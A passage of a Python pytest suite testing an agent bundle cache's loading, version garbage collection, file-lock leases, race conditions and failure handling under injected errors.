    AgentCache(artifact_store, cache_dir).load("agent", "agent/v2")
    assert before == (
        old.workdir.stat().st_ino,
        config.stat().st_ino,
        config.read_bytes(),
        marker.read_bytes(),
    )


def test_gc_keeps_recent_and_newest_versions_and_collects_old(
    artifact_store: LocalArtifactStore, cache_dir: Path
) -> None:
    """GC cannot remove the requested, recent, or newest versions and must reclaim older ones."""
    now = [1000.0]
    cache = AgentCache(
        artifact_store, cache_dir, clock=lambda: now[0], grace_age=10, retained_versions=3
    )
    paths = []
    for index in range(4):
        location = f"agent/{index}"
        _store_bundle(artifact_store, location)
        paths.append(cache.load("agent", location).workdir)
        now[0] += 1
    assert all(path.exists() for path in paths)
    cache.evict("agent")
    now[0] = 1020
    cache.replace("agent", "agent/4", _store_bundle(artifact_store, "agent/4"))
    assert not paths[0].exists()
    assert all(path.exists() for path in paths[2:])


def test_cleanup_failure_is_logged_without_breaking_publication(
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
    monkeypatch: pytest.MonkeyPatch,
    caplog: pytest.LogCaptureFixture,
) -> None:
    """A losing publisher's cleanup failure must not hide its successful load."""
    bundle = _store_bundle(artifact_store, "agent/v1")
    cache = AgentCache(artifact_store, cache_dir)
    first = cache.load("agent", "agent/v1")
    real_rmtree = agent_cache_module.shutil.rmtree

    def fail_cleanup(path, *args, **kwargs):
        if Path(path).name.startswith("bundle-") and Path(path).exists():
            raise PermissionError("cleanup denied")
        return real_rmtree(path, *args, **kwargs)

    monkeypatch.setattr(agent_cache_module.shutil, "rmtree", fail_cleanup)
    assert cache.replace("agent", "agent/v1", bundle).workdir == first.workdir
    assert "cleanup denied" in caplog.text


def test_cleanup_warning_preserves_original_validation_error(
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
    monkeypatch: pytest.MonkeyPatch,
    caplog: pytest.LogCaptureFixture,
) -> None:
    _store_bundle(artifact_store, "agent/invalid", {"config.yaml": "[]"})
    cache = AgentCache(artifact_store, cache_dir)

    def fail_cleanup(path):
        raise PermissionError("cleanup denied")

    monkeypatch.setattr(agent_cache_module.shutil, "rmtree", fail_cleanup)
    with pytest.raises(OmnigentError, match=r"config\.yaml must be a YAML mapping"):
        cache.load("agent", "agent/invalid")
    assert "Could not clean agent cache staging directory" in caplog.text
    assert "cleanup denied" in caplog.text
    assert not (cache_dir / "agent").exists()


def test_late_old_load_cannot_overwrite_new_version(
    artifact_store: LocalArtifactStore, cache_dir: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A slow old extraction must not poison the new version's memory or files."""
    old = "agent-race/old"
    new = "agent-race/new"
    _store_bundle(artifact_store, old)
    _store_bundle(
        artifact_store, new, {"config.yaml": _MINIMAL_CONFIG.replace("test-agent", "new")}
    )
    cache = AgentCache(artifact_store, cache_dir)
    started = threading.Event()
    release = threading.Event()
    real_load_spec = agent_cache_module.load_spec

    def pause_old(source, **kwargs):
        if isinstance(source, bytes) and kwargs.get("dest") is not None and not started.is_set():
            started.set()
            release.wait()
        return real_load_spec(source, **kwargs)

    monkeypatch.setattr(agent_cache_module, "load_spec", pause_old)
    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as pool:
        old_future = pool.submit(cache.load, "agent-race", old)
        started.wait()
        try:
            new_loaded = cache.load("agent-race", new)
        finally:
            release.set()
        old_loaded = old_future.result()
    assert old_loaded.spec.name == "test-agent"
    assert new_loaded.spec.name == "new"
    assert old_loaded.workdir != new_loaded.workdir
    assert cache.load("agent-race", new).spec.name == "new"
    assert yaml.safe_load((new_loaded.workdir / "config.yaml").read_text())["name"] == "new"


def test_gc_does_not_delete_versions_held_by_another_cache(
    artifact_store: LocalArtifactStore, cache_dir: Path
) -> None:
    """GC must not delete a version held by a separate open flock description."""
    now = [1000.0]
    holder = AgentCache(artifact_store, cache_dir, clock=lambda: now[0], grace_age=10)
    collector = AgentCache(
        artifact_store, cache_dir, clock=lambda: now[0], grace_age=10, retained_versions=0
    )
    _store_bundle(artifact_store, "agent/old")
    old = holder.load("agent", "agent/old")
    now[0] += 20
    collector.replace("agent", "agent/new", _store_bundle(artifact_store, "agent/new"))
    assert old.workdir.exists()
    old_path = old.workdir
    holder.evict("agent")
    assert old_path.exists()
    del old
    if holder._sweep_thread:
        holder._sweep_thread.join()
    holder.evict("agent")
    holder._sweep()
    assert not old_path.exists()


def test_warm_load_does_not_wait_for_another_version_repair(
    artifact_store: LocalArtifactStore, cache_dir: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A paused artifact fetch must not block a warm load of a different version."""
    cache = AgentCache(artifact_store, cache_dir)
    _store_bundle(artifact_store, "agent/v1")
    warm = cache.load("agent", "agent/v1")
    _store_bundle(artifact_store, "agent/v0")
    started, release = threading.Event(), threading.Event()
    real_get = artifact_store.get

    def paused_get(location: str) -> bytes:
        started.set()
        release.wait()
        return real_get(location)

    monkeypatch.setattr(artifact_store, "get", paused_get)
    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as pool:
        pending = pool.submit(cache.load, "agent", "agent/v0")
        assert started.wait(5)
        try:
            result = pool.submit(cache.load, "agent", "agent/v1").result(timeout=5)
            assert result.spec is warm.spec
            assert not pending.done()
        finally:
            release.set()
        pending.result(timeout=5)


def test_sweep_removes_deleted_agent_but_preserves_other_process_lease(
    artifact_store: LocalArtifactStore, cache_dir: Path
) -> None:
    """A deleted agent must expire without collecting a version leased elsewhere."""
    now = [1000.0]
    cache = AgentCache(
        artifact_store, cache_dir, clock=lambda: now[0], grace_age=10, sweep_ttl=100
    )
    holder = AgentCache(
        artifact_store, cache_dir, clock=lambda: now[0], grace_age=10, sweep_ttl=100
    )
    for location in ("deleted/v1", "held/v1"):
        _store_bundle(artifact_store, location)
    deleted = cache.load("deleted", "deleted/v1")
    held = holder.load("held", "held/v1")
    deleted_path = deleted.workdir
    del deleted
    cache.evict("deleted")
    now[0] += 101
    cache.replace("other", "other/v1", _store_bundle(artifact_store, "other/v1"))
    cache._sweep()
    assert not deleted_path.parent.exists()
    assert held.workdir.exists()


def test_parse_failure_after_publication_releases_lease(
    artifact_store: LocalArtifactStore, cache_dir: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A failed final parse must not cache a spec or retain a lease."""
    cache = AgentCache(artifact_store, cache_dir)
    bundle = _store_bundle(artifact_store, "agent/v1")
    real_load = agent_cache_module.load_spec

    def fail_published(source, **kwargs):
        if isinstance(source, Path):
            raise ValueError("final parse failed")
        return real_load(source, **kwargs)

    with monkeypatch.context() as patch:
        patch.setattr(agent_cache_module, "load_spec", fail_published)
        with pytest.raises(ValueError, match="final parse failed"):
            cache.replace("agent", "agent/v1", bundle)
    assert ("agent", "agent/v1") not in cache._specs
    assert cache.load("agent", "agent/v1").spec.name == "test-agent"


def test_repair_does_not_move_a_corrupt_version_leased_by_another_cache(
    artifact_store: LocalArtifactStore, cache_dir: Path
) -> None:
    """Repair must preserve a corrupt directory still leased by another reader."""
    _store_bundle(artifact_store, "agent/v1")
    holder = AgentCache(artifact_store, cache_dir)
    old = holder.load("agent", "agent/v1")
    (old.workdir / "config.yaml").unlink()
    inode = old.workdir.stat().st_ino
    repaired = AgentCache(artifact_store, cache_dir).load("agent", "agent/v1")
    assert old.workdir.stat().st_ino == inode
    assert not (old.workdir / "config.yaml").exists()
    assert repaired.workdir != old.workdir
    assert repaired.spec.name == "test-agent"
    assert (
        AgentCache(artifact_store, cache_dir).load("agent", "agent/v1").workdir == repaired.workdir
    )


def test_warm_load_reloads_when_workdir_vanishes(
    artifact_store: LocalArtifactStore, cache_dir: Path
) -> None:
    """A warm cached spec must not return a workdir removed outside the cache."""
    _store_bundle(artifact_store, "agent/v1")
    cache = AgentCache(artifact_store, cache_dir)
    old = cache.load("agent", "agent/v1")
    agent_cache_module.shutil.rmtree(old.workdir)
    loaded = cache.load("agent", "agent/v1")
    assert loaded.workdir.is_dir()
    assert loaded.spec.name == "test-agent"
    assert loaded.spec is not old.spec


def test_failed_publish_cleans_lease_and_sweep_removes_orphans(
    artifact_store: LocalArtifactStore, cache_dir: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Failed publication and orphan leases must not keep empty agent directories alive."""
    cache = AgentCache(artifact_store, cache_dir, grace_age=0)
    _store_bundle(artifact_store, "failed/v1")
    real_rename = Path.rename

    def fail_publish(source: Path, target: Path) -> Path:
        if target.parent.name == "failed":
            raise OSError("publish failed")
        return real_rename(source, target)

    with monkeypatch.context() as patch:
        patch.setattr(Path, "rename", fail_publish)
        with pytest.raises(OSError, match="publish failed"):
            cache.load("failed", "failed/v1")
    parent = cache_dir / ".versions" / "failed"
    assert not list(parent.glob("*.lease"))
    (parent / "orphan.lease").touch()
    cache.replace("other", "other/v1", _store_bundle(artifact_store, "other/v1"))
    cache._sweep()
    assert not parent.exists()


def test_unavailable_flock_does_not_break_cold_load(
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
    monkeypatch: pytest.MonkeyPatch,
    caplog: pytest.LogCaptureFixture,
) -> None:
    """Unsupported filesystem locking must not crash a cold load."""
    if agent_cache_module.fcntl is None:
        pytest.skip("flock unavailable")
    _store_bundle(artifact_store, "agent/v1")

    def unsupported(*args):
        raise OSError(errno.ENOLCK, "unsupported")

    class UnsupportedFlock:
        LOCK_EX = agent_cache_module.fcntl.LOCK_EX
        LOCK_NB = agent_cache_module.fcntl.LOCK_NB
        LOCK_SH = agent_cache_module.fcntl.LOCK_SH
        flock = staticmethod(unsupported)

    monkeypatch.setattr(agent_cache_module, "_lease_support_failed", False)
    monkeypatch.setattr(agent_cache_module, "fcntl", UnsupportedFlock)
    cache = AgentCache(artifact_store, cache_dir)
    assert cache.load("agent", "agent/v1").spec.name == "test-agent"
    assert caplog.text.count("leases unavailable") == 1


def test_cold_load_sweeps_deleted_agent_after_ttl(
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
) -> None:
    """Cold disk hits must sweep deleted agents even without a new publication."""
    now = [1000.0]
    cache = AgentCache(
        artifact_store, cache_dir, clock=lambda: now[0], grace_age=10, sweep_ttl=100
    )
    for name in ("deleted", "other"):
        _store_bundle(artifact_store, f"{name}/v1")
        cache.load(name, f"{name}/v1")
    deleted_path = cache.load("deleted", "deleted/v1").workdir
    cache.evict("deleted")
    cache.evict("other")
    now[0] += 101
    cache.load("other", "other/v1")
    cache._sweep()
    assert not deleted_path.exists()


def test_concurrent_cold_loads_at_memory_cap_keep_returned_leases(
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Concurrent insertions at the cap must not evict a live result's lease."""
    monkeypatch.setattr(agent_cache_module, "_MAX_MEMORY_VERSIONS", 1)
    cache = AgentCache(artifact_store, cache_dir)
    for name in ("first", "second", "third"):
        _store_bundle(artifact_store, f"{name}/v1")
    first = cache.load("first", "first/v1")
    barrier = threading.Barrier(2)
    original = cache._remember

    def synchronized(key, entry):
        barrier.wait()
        original(key, entry)

    monkeypatch.setattr(cache, "_remember", synchronized)
    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as pool:
        results = list(pool.map(lambda name: cache.load(name, f"{name}/v1"), ("second", "third")))
    cache.evict("first")
    assert first.workdir.is_dir()
    assert all(result.workdir.is_dir() for result in results)


def test_warm_hit_keeps_spec_and_workdir_together_during_evict(
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Eviction during a warm hit must not substitute a different workdir."""
    _store_bundle(artifact_store, "agent/v1")
    cache = AgentCache(artifact_store, cache_dir)
    original = cache.load("agent", "agent/v1")
    sibling = original.workdir.with_name(original.workdir.name + ".sibling")
    original.workdir.rename(sibling)
    assert isinstance(original._lease, agent_cache_module._Lease)
    entry = agent_cache_module._Entry(original.spec, sibling, original._lease)
    cache._specs[("agent", "agent/v1")] = entry
    is_dir = Path.is_dir
    evicted = False

    def evict_during_check(path):
        nonlocal evicted
        if path == sibling and not evicted:
            evicted = True
            cache.evict("agent")
        return is_dir(path)

    monkeypatch.setattr(Path, "is_dir", evict_during_check)
    result = cache.load("agent", "agent/v1")
    assert result.spec is original.spec
    assert result.workdir == sibling


def test_idle_entries_release_and_warm_load_releases_again(artifact_store, cache_dir):
    """Idle memory entries must not block collection and must re-lease before reuse."""
    now = [1000.0]
    cache = AgentCache(
        artifact_store, cache_dir, clock=lambda: now[0], grace_age=10, sweep_ttl=100
    )
    _store_bundle(artifact_store, "agent/v1")
    result = cache.load("agent", "agent/v1")
    path, spec = result.workdir, result.spec
    del result
    now[0] += 11
    cache._sweep()
    assert cache._specs[("agent", "agent/v1")].lease is None
    warm = cache.load("agent", "agent/v1")
    assert warm.spec is spec and warm._lease is not None
    del warm
    now[0] += 11
    cache._sweep()
    agent_cache_module.shutil.rmtree(path)
    assert cache.load("agent", "agent/v1").spec is not spec


def test_loaded_agent_copy_does_not_duplicate_lease_fd(artifact_store, cache_dir):
    """Copying a loaded agent must not independently close its lease descriptor."""
    _store_bundle(artifact_store, "agent/v1")
    loaded = AgentCache(artifact_store, cache_dir).load("agent", "agent/v1")
    copied = copy.deepcopy(loaded)
    restored = pickle.loads(pickle.dumps(loaded))
    assert copied._lease is loaded._lease
    assert restored._lease is None
    del copied, restored
    assert isinstance(loaded._lease, agent_cache_module._Lease)
    agent_cache_module.os.fstat(loaded._lease.fd)


def test_descriptor_exhaustion_does_not_fail_load_or_disable_collection(
    artifact_store, cache_dir, monkeypatch
):
    """Descriptor exhaustion must degrade a load without disabling future collection."""
    _store_bundle(artifact_store, "agent/v1")
    cache = AgentCache(artifact_store, cache_dir)
    real_open = agent_cache_module.os.open

    def fail_lease(path, *args, **kwargs):
        if str(path).endswith(".lease"):
            raise OSError(errno.EMFILE, "too many files")
        return real_open(path, *args, **kwargs)

    with monkeypatch.context() as patch:
        patch.setattr(agent_cache_module.os, "open", fail_lease)
        assert cache.load("agent", "agent/v1").spec.name == "test-agent"
    assert not agent_cache_module._lease_support_failed


def test_unsupported_lease_prevents_other_cache_from_collecting(
    artifact_store, cache_dir, monkeypatch
):
    """A reader without flock must survive collection by another cache in this process."""
    now = [1000.0]
    _store_bundle(artifact_store, "held/v1")
    _store_bundle(artifact_store, "other/v1")
    holder = AgentCache(
        artifact_store, cache_dir, clock=lambda: now[0], grace_age=10, sweep_ttl=100
    )
    collector = AgentCache(
        artifact_store, cache_dir, clock=lambda: now[0], grace_age=10, sweep_ttl=100
    )
    real_fcntl = agent_cache_module.fcntl
    assert real_fcntl is not None

    class UnsupportedFlock:
        LOCK_EX = real_fcntl.LOCK_EX
        LOCK_NB = real_fcntl.LOCK_NB
        LOCK_SH = real_fcntl.LOCK_SH

        @staticmethod
        def flock(*args):
            raise OSError(errno.ENOLCK, "unsupported")

    monkeypatch.setattr(agent_cache_module, "_lease_support_failed", False)
    with monkeypatch.context() as patch:
        patch.setattr(agent_cache_module, "fcntl", UnsupportedFlock)
        held = holder.load("held", "held/v1")
        if holder._sweep_thread:
            holder._sweep_thread.join()
    now[0] += 101
    collector.load("other", "other/v1")
    if collector._sweep_thread:
        collector._sweep_thread.join()
    assert held.workdir.is_dir()


def test_warm_traffic_schedules_sweep_after_idle_peer_releases(artifact_store, cache_dir):
    """Warm-only traffic must reclaim a deleted version once an idle peer releases it."""
    now = [1000.0]
    peer = AgentCache(artifact_store, cache_dir, clock=lambda: now[0], grace_age=10, sweep_ttl=100)
    cache = AgentCache(
        artifact_store, cache_dir, clock=lambda: now[0], grace_age=10, sweep_ttl=100
    )
    for name in ("deleted", "warm"):
        _store_bundle(artifact_store, f"{name}/v1")
    result = peer.load("deleted", "deleted/v1")
    path = result.workdir
    del result
    warm = cache.load("warm", "warm/v1")
    for instance in (peer, cache):
        if instance._sweep_thread:
            instance._sweep_thread.join()
    now[0] += 101
    peer._sweep()
    cache.load("warm", "warm/v1")
    assert cache._sweep_thread is not None
    cache._sweep_thread.join()
    assert not path.exists()
    assert warm.workdir.exists()
